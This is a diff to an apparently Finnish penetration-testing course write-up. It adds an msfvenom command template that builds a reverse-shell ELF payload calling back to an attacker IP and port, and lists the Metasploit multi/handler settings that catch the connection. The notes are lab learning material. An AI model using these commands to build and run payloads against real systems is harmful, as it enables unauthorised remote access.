@@ -231,7 +231,7 @@ Tässä Ffuf etsii tiedostoja, joiden tiedostopääte on `log.`, eli metodi etsi
 
 ## msfvenom
 
-Tämä tehtävä oli mielenkiintoinen ja keskittyy haavoittuvuuksien hyödyntämiseen käyttäen Metasploitin msfvenom -työkalua.
+Tämä tehtävä oli mielenkiintoinen ja keskittyy haavoittuvuuksien hyödyntämiseen käyttäen Metasploitin msfvenom -työkalua. Komennon esimerkki: `msfvenom -p <payload> LHOST=<hyökkääjän IP> LPORT=<kuuntelijan portti> -f elf -o shell.elf`
 
 ![c3101979ba823ee8859508a627960518](https://github.com/Vanam0/tunkeutumistestaus/assets/122449444/e43c2fe9-316f-4f50-87ac-a8a02c3206a7)
 
@@ -243,6 +243,13 @@ Tämä tehtävä oli mielenkiintoinen ja keskittyy haavoittuvuuksien hyödyntäm
 
 ![kuva](https://github.com/Vanam0/tunkeutumistestaus/assets/122449444/c92e7a0d-ba77-42f5-8857-b4f7cc08eb5a)
 
+
+multi/handeler asetus kuuntelee haittaohjelmaa näillä komennoilla:
+
+`set payload`: linux/x64/... (Keskeinen osa hyökkäystä)
+`set LHOST`: hyökkääjän IP-osoite
+`set LPORT`: kuuntelijan portti
+`exploit -j`: käynnistää hyökkäyksen
 
 <details>
 
